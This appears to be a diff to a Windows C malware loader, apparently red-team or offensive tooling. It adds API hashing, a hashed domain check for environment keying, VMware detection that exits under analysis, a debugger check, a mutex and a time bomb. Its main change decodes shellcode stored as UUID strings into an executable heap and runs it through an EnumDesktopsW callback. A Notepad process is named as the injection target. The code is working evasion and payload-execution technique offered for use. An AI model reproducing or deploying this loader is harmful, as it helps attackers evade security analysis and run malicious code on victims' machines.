@@ -7,7 +7,11 @@
 
 #include <Windows.h>
 #include <stdio.h>
+#include <mmeapi.h>
 #include "include.h"
+
+#pragma comment(lib, "Rpcrt4.lib")
+#pragma comment(lib, "Winmm.lib")
 
 /*
 All Definitions, Macros etc #define MAX_BUF_SIZE    2048
@@ -17,13 +21,16 @@ All Definitions, Macros etc #define MAX_BUF_SIZE    2048
 #define MIN_SIZE   5
 #define PPOWER     255 
 #define MAX        1000000000   
-#define _DOMAIN    L"RADIANTCORP"
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 #define ProductKey_Reg ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\DefaultProductKey2")
+#define Machine_GUID ("SOFTWARE\\Microsoft\\Cryptography")
+// #define _DOMAIN    L"RADIANTCORP"   replaced with hash equivalent 
 // #define MUTEX_NAME TEXT("Global\\Tcpip_Perf_Library_Lock_PID_145af") replaced with random Mutex Generation
 
 // API hashes
-#define DomainHash         0x461A488C
+#define HeapCreateHash     0xF6BF1E07
+#define HeapAllocHash      0xD7278154
+#define DomainHash         0xD70C14B5
 #define VirtualFreeHash    0x81178A12
 #define OpenProcessHash    0x74F0ACB6
 #define VirtualAllocHash   0x38E87001
@@ -36,14 +43,17 @@ extern PVOID   GetNTDLLBase();
 extern PVOID   GetK32ModuleHandle();
 
 // kernel32.dll exports
-typedef BOOL     (WINAPI* CLOSEHANDLE)(HANDLE);
-typedef HANDLE   (WINAPI* GETCURRENTPROCESS)();
-typedef HMODULE  (WINAPI* LOADLIBRARYA)(LPCSTR);
-typedef HANDLE   (WINAPI* _tOpenProcess)(DWORD, BOOL, DWORD);
-typedef BOOL     (WINAPI* _tVirtualFree)(LPVOID, SIZE_T, DWORD);
-typedef LPVOID*  (WINAPI* _tVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
-typedef HANDLE   (WINAPI* _tCreateMutexA)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
-typedef BOOL     (WINAPI* _tSetProcessMitigationPolicy)( PROCESS_MITIGATION_POLICY ,PVOID,SIZE_T);
+typedef BOOL       (WINAPI* CLOSEHANDLE)(HANDLE);
+typedef HANDLE     (WINAPI* GETCURRENTPROCESS)();
+typedef HMODULE    (WINAPI* LOADLIBRARYA)(LPCSTR);
+typedef HANDLE     (WINAPI* _tOpenProcess)(DWORD, BOOL, DWORD);
+typedef BOOL       (WINAPI* _tVirtualFree)(LPVOID, SIZE_T, DWORD);
+typedef LPVOID*    (WINAPI* _tVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef HANDLE     (WINAPI* _tCreateMutexA)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
+typedef BOOL       (WINAPI* _tSetProcessMitigationPolicy)( PROCESS_MITIGATION_POLICY ,PVOID,SIZE_T);
+typedef HANDLE     (WINAPI* _HeapCreate)(DWORD ,SIZE_T ,SIZE_T);
+typedef LPVOID     (WINAPI* _HeapAlloc)(HANDLE ,DWORD ,SIZE_T);
+typedef RPC_STATUS (RPC_ENTRY* _UuidtoString)(RPC_CSTR ,UUID* );
 
 // ntdll.dll exports
 typedef NTSTATUS (NTAPI* _tNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
@@ -56,6 +66,8 @@ VOID    AmIDebugged();
 CHAR*   GetDynamicMutex();
 PWSTR   ReadEnvValue(PWSTR);
 FARPROC GetFuncAddr(PVOID, DWORD);
+DWORD   compute_hash(const void*, UINT32);
+
 
 
 // Struct Defenitions
@@ -210,6 +222,8 @@ DWORD dllpolicy() {
 	return 0;
 }
 
+
+
 void EnvChecks() {
 	
 	WCHAR userdomain[]   = { 'U','S','E','R','D','O','M','A','I','N',0 };
@@ -230,10 +244,19 @@ void EnvChecks() {
 	PWSTR dnsname = ReadEnvValue(USERDNSDOMAIN);
 	*/
 
-	// Change to Hash Compare, Hardcoding not good
-	if (wcscmp(domain, _DOMAIN) == 0) {
+	 if (compute_hash(domain, 0) == DomainHash)
+	 {
+		 printf("Domain Match, Environment Good\n");
+	
+	 }
+	 
+	 printf("%p, %p", compute_hash(domain, 0), DomainHash);
+	
+	 // Change to Hash Compare, Hardcoding not good
+	/* if (wcscmp(domain, _DOMAIN) == 0) {
 		printf("Match\n");
 	}
+	*/
 }
 
 void AmIDebugged() {
@@ -261,27 +284,37 @@ BOOL(WINAPI* _EnumDisplayDevicesA)(
 	) = NULL;
 
 
-void checkvm() {
+BOOL checkvm() {
 
+		char* p;
+		char* devicename;
 		DWORD iDevNum = 0;
 		DEVMODEA DevMode = { .dmSize = sizeof(DEVMODEA) };
 		DISPLAY_DEVICEA DisplayDevice = { .cb = sizeof(DISPLAY_DEVICEA) };
+
+		CHAR* vware[] = {'V','M','w','a','r','e','0'};
 
 		while (EnumDisplayDevicesA(NULL, iDevNum, &DisplayDevice, EDD_GET_DEVICE_INTERFACE_NAME))
 		{
 
 			DWORD State = DisplayDevice.StateFlags;
-			//printf("%s\n", DisplayDevice.DeviceName);
-			printf("  %s\n", DisplayDevice.DeviceString);
+			printf(" %s\n", DisplayDevice.DeviceString);
 			
-			char* test = DisplayDevice.DeviceString;
+			devicename = DisplayDevice.DeviceString;
 			
+			if (strstr(devicename, "VMware") != NULL) {
+
+				printf("Vmware Detected\n");
+				return FALSE;
+			}
+ 
 			if (EnumDisplaySettingsExA(DisplayDevice.DeviceName, ENUM_CURRENT_SETTINGS, &DevMode, 0))
 			{
 				
 			}
 			iDevNum++;
 		}
+		return TRUE;
 	}
 
 // Unique Mutex for each machine
@@ -444,8 +477,12 @@ int TimeBomb(int n) {
 
 	char value[255];
 	DWORD BufferSize = BUFFER;
-	CHAR OSID[] = {'O','S','P','r','o','d','u','c','t','C','o','n','t','e','n','t','I','D', 0};
-	RegGetValueA(HKEY_LOCAL_MACHINE, ProductKey_Reg, OSID, RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+	 CHAR OSID[] = {'O','S','P','r','o','d','u','c','t','C','o','n','t','e','n','t','I','D', 0};
+	 RegGetValueA(HKEY_LOCAL_MACHINE, ProductKey_Reg, OSID, RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+	
+	// CHAR mguid[] = "MachineGuid";
+	// RegGetValueA(HKEY_LOCAL_MACHINE, Machine_GUID, mguid, RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+	
 	
 	int len = strlen(value);
 
@@ -482,7 +519,9 @@ int wmain() {
 	if (!MutexCheck(mutexe)) { printf("Mutex Exists\n");  return; }
 
 	_getch();
-	checkvm();
+	
+	if (!checkvm()) { printf("In VM Exiting\n"); return; }
+
 
 	// Target Process to Inject into
 	WCHAR procname[] = { 'N','o','t','e','p', 'a', 'd', '.', 'e','x','e', 0 };
@@ -495,7 +534,7 @@ int wmain() {
 
 	// All Required Variables
 	HANDLE hProc = INVALID_HANDLE_VALUE;
-	PVOID k32addr, OpenProcAddr;
+	PVOID k32addr, OpenProcAddr, heapcreateaddr, heapallocaddr;
 	DWORD pid;
 
 	// All Good, resolve needed functions 
@@ -511,14 +550,38 @@ int wmain() {
 	hProc = ((_tOpenProcess)OpenProcAddr)(PROCESS_ALL_ACCESS, FALSE, FindProcID(procname));
 	
 
-
+// https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala
 	_getch();
 
-	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	heapcreateaddr = (ULONG_PTR)GetFuncAddr((HMODULE)k32addr, HeapCreateHash);
+
+	heapallocaddr = (ULONG_PTR)GetFuncAddr((HMODULE)k32addr, HeapAllocHash);
+
+	HANDLE hc = ((_HeapCreate)heapcreateaddr)(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
 	
-	memcpy(exec, shellcode, sizeof(shellcode));
 	
-	((void(*)())exec)();
+	void* ha = HeapAlloc(hc, 0, 0x100000);
+	
+	DWORD_PTR hptr = (DWORD_PTR)ha;
+	int elems = sizeof(uuids) / sizeof(uuids[0]);
+
+	
+	for (int i = 0; i < elems; i++) {
+		RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
+		if (status != RPC_S_OK) { CloseHandle(ha);return -1;}
+		hptr += 16;
+	}
+
+	printf("[*] Hexdumpss: ");
+	for (int i = 0; i < elems * 16; i++) {
+		printf("%02X ", ((unsigned char*)ha)[i]);
+	}
+	_getch();
+
+	EnumDesktopsW(NULL, (DESKTOPENUMPROCW)ha, NULL);
+
+	CloseHandle(ha);
 
 
 	return 0;
